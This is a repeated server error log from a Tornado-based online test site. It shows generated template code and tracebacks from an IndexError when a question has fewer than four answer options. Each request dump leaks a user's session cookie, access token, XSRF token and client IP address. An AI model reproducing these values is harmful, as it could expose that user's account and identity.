 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3b6b8e4c854802b2dbd6&answers=%5B1%5D&cursor=6&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.6.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 86.21ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3b6b8e4c854802b2dbd6&answers=%5B3%5D&cursor=12&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.7.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 73.70ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3b6b8e4c854802b2dbd6&answers=%5B3%5D&cursor=14&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.7.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 71.53ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
